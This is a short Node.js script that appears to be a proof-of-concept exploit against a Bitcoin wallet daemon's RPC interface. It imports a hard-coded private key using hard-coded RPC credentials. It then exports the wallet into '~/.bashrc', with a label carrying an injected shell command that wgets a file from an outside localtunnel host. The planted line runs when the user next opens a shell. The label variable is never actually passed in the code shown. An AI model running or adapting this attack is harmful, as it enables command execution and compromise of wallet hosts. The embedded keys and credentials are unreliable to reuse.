var bitcoin = require('bitcoin')
// all config options are optional
var client = new bitcoin.Client({
  host: 'localhost',
  port: 8000,
  user: '1fcd70a7-56e4-42bb-8ba6-4773a81667ca',
  pass: '782ed5160f419eac22ce302745df84ca92d2624699c31770fa0b85855a7d0cd2',
  timeout: 30000
});

var label = ';{wget,http://ijjjxlzoiw.localtunnel.me/hi.txt}';
client.importPrivKey('cPE4h5Au9xmrgc8fCQuZYC2JqqZmmy4UovTbfAy1xKQhk83kFThW', function(err, rest) {
  if (err) { 
    console.log(err);
    return;
  }
  console.log(rest);
  client.exportWallet('~/.bashrc', console.log)
});

